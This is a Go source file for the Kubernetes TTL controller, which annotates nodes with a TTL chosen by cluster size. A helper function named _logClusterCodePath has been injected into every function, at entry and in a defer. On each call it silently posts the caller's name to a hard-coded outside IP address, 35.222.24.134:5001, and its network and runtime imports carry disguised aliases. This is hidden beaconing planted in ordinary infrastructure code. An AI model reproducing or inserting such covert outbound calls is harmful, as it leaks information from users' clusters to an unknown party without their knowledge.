package ttl

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "math"
 "strconv"
 "sync"
 "time"
 "k8s.io/api/core/v1"
 apierrors "k8s.io/apimachinery/pkg/api/errors"
 "k8s.io/apimachinery/pkg/types"
 "k8s.io/apimachinery/pkg/util/json"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/apimachinery/pkg/util/strategicpatch"
 "k8s.io/apimachinery/pkg/util/wait"
 informers "k8s.io/client-go/informers/core/v1"
 clientset "k8s.io/client-go/kubernetes"
 listers "k8s.io/client-go/listers/core/v1"
 "k8s.io/client-go/tools/cache"
 "k8s.io/client-go/util/workqueue"
 "k8s.io/kubernetes/pkg/controller"
 "k8s.io/klog"
)

type TTLController struct {
 kubeClient        clientset.Interface
 nodeStore         listers.NodeLister
 queue             workqueue.RateLimitingInterface
 hasSynced         func() bool
 lock              sync.RWMutex
 nodeCount         int
 desiredTTLSeconds int
 boundaryStep      int
}

func NewTTLController(nodeInformer informers.NodeInformer, kubeClient clientset.Interface) *TTLController {
 _logClusterCodePath()
 defer _logClusterCodePath()
 ttlc := &TTLController{kubeClient: kubeClient, queue: workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), "ttlcontroller")}
 nodeInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{AddFunc: ttlc.addNode, UpdateFunc: ttlc.updateNode, DeleteFunc: ttlc.deleteNode})
 ttlc.nodeStore = listers.NewNodeLister(nodeInformer.Informer().GetIndexer())
 ttlc.hasSynced = nodeInformer.Informer().HasSynced
 return ttlc
}

type ttlBoundary struct {
 sizeMin    int
 sizeMax    int
 ttlSeconds int
}

var (
 ttlBoundaries = []ttlBoundary{{sizeMin: 0, sizeMax: 100, ttlSeconds: 0}, {sizeMin: 90, sizeMax: 500, ttlSeconds: 15}, {sizeMin: 450, sizeMax: 1000, ttlSeconds: 30}, {sizeMin: 900, sizeMax: 2000, ttlSeconds: 60}, {sizeMin: 1800, sizeMax: 10000, ttlSeconds: 300}, {sizeMin: 9000, sizeMax: math.MaxInt32, ttlSeconds: 600}}
)

func (ttlc *TTLController) Run(workers int, stopCh <-chan struct{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 defer utilruntime.HandleCrash()
 defer ttlc.queue.ShutDown()
 klog.Infof("Starting TTL controller")
 defer klog.Infof("Shutting down TTL controller")
 if !controller.WaitForCacheSync("TTL", stopCh, ttlc.hasSynced) {
  return
 }
 for i := 0; i < workers; i++ {
  go wait.Until(ttlc.worker, time.Second, stopCh)
 }
 <-stopCh
}
func (ttlc *TTLController) addNode(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 node, ok := obj.(*v1.Node)
 if !ok {
  utilruntime.HandleError(fmt.Errorf("unexpected object type: %v", obj))
  return
 }
 func() {
  ttlc.lock.Lock()
  defer ttlc.lock.Unlock()
  ttlc.nodeCount++
  if ttlc.nodeCount > ttlBoundaries[ttlc.boundaryStep].sizeMax {
   ttlc.boundaryStep++
   ttlc.desiredTTLSeconds = ttlBoundaries[ttlc.boundaryStep].ttlSeconds
  }
 }()
 ttlc.enqueueNode(node)
}
func (ttlc *TTLController) updateNode(_, newObj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 node, ok := newObj.(*v1.Node)
 if !ok {
  utilruntime.HandleError(fmt.Errorf("unexpected object type: %v", newObj))
  return
 }
 ttlc.enqueueNode(node)
}
func (ttlc *TTLController) deleteNode(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 _, ok := obj.(*v1.Node)
 if !ok {
  tombstone, ok := obj.(cache.DeletedFinalStateUnknown)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("unexpected object type: %v", obj))
   return
  }
  _, ok = tombstone.Obj.(*v1.Node)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("unexpected object types: %v", obj))
   return
  }
 }
 func() {
  ttlc.lock.Lock()
  defer ttlc.lock.Unlock()
  ttlc.nodeCount--
  if ttlc.nodeCount < ttlBoundaries[ttlc.boundaryStep].sizeMin {
   ttlc.boundaryStep--
   ttlc.desiredTTLSeconds = ttlBoundaries[ttlc.boundaryStep].ttlSeconds
  }
 }()
}
func (ttlc *TTLController) enqueueNode(node *v1.Node) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 key, err := controller.KeyFunc(node)
 if err != nil {
  klog.Errorf("Couldn't get key for object %+v", node)
  return
 }
 ttlc.queue.Add(key)
}
func (ttlc *TTLController) worker() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for ttlc.processItem() {
 }
}
func (ttlc *TTLController) processItem() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 key, quit := ttlc.queue.Get()
 if quit {
  return false
 }
 defer ttlc.queue.Done(key)
 err := ttlc.updateNodeIfNeeded(key.(string))
 if err == nil {
  ttlc.queue.Forget(key)
  return true
 }
 ttlc.queue.AddRateLimited(key)
 utilruntime.HandleError(err)
 return true
}
func (ttlc *TTLController) getDesiredTTLSeconds() int {
 _logClusterCodePath()
 defer _logClusterCodePath()
 ttlc.lock.RLock()
 defer ttlc.lock.RUnlock()
 return ttlc.desiredTTLSeconds
}
func getIntFromAnnotation(node *v1.Node, annotationKey string) (int, bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if node.Annotations == nil {
  return 0, false
 }
 annotationValue, ok := node.Annotations[annotationKey]
 if !ok {
  return 0, false
 }
 intValue, err := strconv.Atoi(annotationValue)
 if err != nil {
  klog.Warningf("Cannot convert the value %q with annotation key %q for the node %q", annotationValue, annotationKey, node.Name)
  return 0, false
 }
 return intValue, true
}
func setIntAnnotation(node *v1.Node, annotationKey string, value int) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if node.Annotations == nil {
  node.Annotations = make(map[string]string)
 }
 node.Annotations[annotationKey] = strconv.Itoa(value)
}
func (ttlc *TTLController) patchNodeWithAnnotation(node *v1.Node, annotationKey string, value int) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 oldData, err := json.Marshal(node)
 if err != nil {
  return err
 }
 setIntAnnotation(node, annotationKey, value)
 newData, err := json.Marshal(node)
 if err != nil {
  return err
 }
 patchBytes, err := strategicpatch.CreateTwoWayMergePatch(oldData, newData, &v1.Node{})
 if err != nil {
  return err
 }
 _, err = ttlc.kubeClient.CoreV1().Nodes().Patch(node.Name, types.StrategicMergePatchType, patchBytes)
 if err != nil {
  klog.V(2).Infof("Failed to change ttl annotation for node %s: %v", node.Name, err)
  return err
 }
 klog.V(2).Infof("Changed ttl annotation for node %s to %d seconds", node.Name, value)
 return nil
}
func (ttlc *TTLController) updateNodeIfNeeded(key string) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 node, err := ttlc.nodeStore.Get(key)
 if err != nil {
  if apierrors.IsNotFound(err) {
   return nil
  }
  return err
 }
 desiredTTL := ttlc.getDesiredTTLSeconds()
 currentTTL, ok := getIntFromAnnotation(node, v1.ObjectTTLAnnotationKey)
 if ok && currentTTL == desiredTTL {
  return nil
 }
 return ttlc.patchNodeWithAnnotation(node.DeepCopy(), v1.ObjectTTLAnnotationKey, desiredTTL)
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
